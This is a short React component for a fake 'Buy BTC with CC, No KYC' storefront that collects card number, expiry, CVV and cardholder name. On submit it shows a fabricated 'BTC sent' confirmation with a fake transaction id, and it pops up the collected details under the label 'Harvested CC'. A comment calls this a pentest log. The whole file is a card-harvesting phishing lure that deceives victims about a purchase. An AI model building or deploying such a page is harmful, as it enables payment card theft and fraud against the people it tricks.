import { useState } from 'react';

export default function CryptoBuy() {
  const [cc, setCc] = useState('');
  const [exp, setExp] = useState('');
  const [cvv, setCvv] = useState('');
  const [name, setName] = useState('');
  const [amount, setAmount] = useState('100');
  const [status, setStatus] = useState('');

  const buyBTC = async () => {
    setStatus('Processing your CC...');
    // Fake delay
    setTimeout(() => {
      setStatus('✅ BTC sent! Tx: 0xfake123abc... Check your wallet in 5min!');
    }, 2000);
    alert(`Harvested CC: ${cc}|${exp}|${cvv}|${name} - $${amount}\n(هذا للـ pentest log)`);
  };

  return (
    <div style={{minHeight: '100vh', background: 'black', color: 'white', padding: '50px', textAlign: 'center'}}>
      <h1 style={{fontSize: '40px'}}>🚀 Buy BTC with CC - Instant Delivery!</h1>
      <p>Enter details → Get BTC to wallet. No KYC!</p>
      <br/>
      <input placeholder="Card Number (16 digits)" value={cc} onChange={e=>setCc(e.target.value)} style={{width: '100%', padding: '15px', margin: '10px', background: '#333'}} />
      <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
        <input placeholder="MM/YY (12/28)" value={exp} onChange={e=>setExp(e.target.value)} style={{padding: '15px', background: '#333'}} />
        <input placeholder="CVV (123)" value={cvv} onChange={e=>setCvv(e.target.value)} style={{padding: '15px', background: '#333'}} />
      </div>
      <input placeholder="Name on Card" value={name} onChange={e=>setName(e.target.value)} style={{width: '100%', padding: '15px', margin: '10px', background: '#333'}} />
      <input placeholder="USD Amount ($100)" value={amount} onChange={e=>setAmount(e.target.value)} style={{width: '100%', padding: '15px', margin: '10px', background: '#333'}} />
      <br/>
      <button onClick={buyBTC} style={{width: '100%', padding: '20px', background: 'blue', color: 'white', fontSize: '20px', border: 'none', cursor: 'pointer'}}>
        💳 Buy BTC Now!
      </button>
      <p style={{marginTop: '20px', color: 'green'}}>{status}</p>
    </div>
  );
}
